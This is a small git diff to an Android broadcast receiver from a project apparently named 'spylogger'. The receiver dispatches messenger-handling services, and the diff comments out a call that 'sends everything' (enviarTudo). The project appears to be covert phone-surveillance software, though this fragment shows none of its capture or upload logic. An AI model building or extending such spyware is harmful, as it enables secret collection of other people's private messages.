@@ -10,7 +10,6 @@ import com.gravatasufoca.spylogger.helpers.MensageiroFactory;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.services.Mensageiro;
 import com.gravatasufoca.spylogger.services.MessengerService;
-import com.gravatasufoca.spylogger.utils.Utils;
 
 /**
  * Created by bruno on 08/04/17.
@@ -19,7 +18,7 @@ import com.gravatasufoca.spylogger.utils.Utils;
 public class MensagemMensageiroReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(final Context context, Intent intent) {
-        if (context != null) {
+         if (context != null) {
             Log.d("spylogger","mensagem recebida");
             Mensageiro mensageiro = new MensageiroFactory(context).build(intent.getStringExtra("classe"));
             if (mensageiro != null) {
@@ -27,7 +26,7 @@ public class MensagemMensageiroReceiver extends BroadcastReceiver {
                 new MensageiroAsyncHelper(context, new TaskComplete() {
                     @Override
                     public void onFinish(Object object) {
-                        Utils.enviarTudo(context);
+//                        Utils.enviarTudo(context);
                     }
                 }).execute(new MessengerService(context));
             }
